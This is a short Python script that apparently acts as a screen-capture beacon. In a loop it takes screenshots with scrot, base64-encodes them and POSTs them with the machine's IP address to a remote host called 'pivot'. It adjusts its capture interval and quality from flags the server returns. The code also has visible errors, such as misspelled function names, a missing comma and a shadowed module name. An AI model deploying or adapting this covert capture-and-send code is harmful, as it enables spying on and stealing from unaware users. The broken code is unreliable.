import subprocess
import json
import http.client as http
import base64
import socket
import time
with open("{}: grab_log.txt".format(time.strfttime("%d/%m/%Y - %H:%M:%S")) 'w') as log:
    try:
        log.write("Beginning @ " + time.strfttime("%d/%m/%Y - %H:%M:%S"))
        try:
            arch = subprocess.check_output(['uname', '-m'])
        except FileNotFoundError:
            arch = None
        log.write("arch: " + str(arch))
        server_path = "/includes/screen_requrest.php"
        log.write("server path: " + str(server_path))
        hostname = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_STREAM)]][0][1]
        log.write("hostname: " + str(hostname))
        server_ip = "pivot"
        en = False
        time = 5
        thumb_perc = 50
        quality = 50
        headers = {'Content-type': 'application/json'}

        while arch:
            log.write("en state: " + en)
            subprocess.run(['sleep', str(time)])
            _obj = {
                'hostname': hostname,
                'file': ""
            }
            if en == True:
                log.write("screenshotting enabled")
                log.write("thumbnail percent = quality = " + str(quality))
                subprocess.run(['scrot', '--thumb', str(thumb_perc), '-q', str(quality), '{}.jpg'.format(hostname)])

                with open('{}-thumb.jpg'.format(hostname), 'rb') as f:
                    img = f.read()
                    img = base64.b64encode(img).decode()
                    _obj['file'] = img
            else:
                log.write("screenshotting disabled")
            conn = http.HTTPConnection("{}:80".format(server_ip))
            _obj = json.dumps(_obj)
            _obj = _obj.encode()
            conn.request("POST", server_path, _obj, headers)
            json_flags = conn.getresponse().read().decode()
            conn.close()
            flags = json.loads(json_flags)
            if 'en' in flags:
                en = flags['en']
            if 'time' in flags:
                time = flags['time']
            if 'quality' in flags:
                thumb_perc = quality = flags['quality']
            log.write("Flags at EOF: \n")
            [log.write(y) for y in ["{0}: {1}".format(x, flags[x]) for x in flags]]
    except Exception as excp:
        log.write("ERROR: \n" + str(excp) + "\n")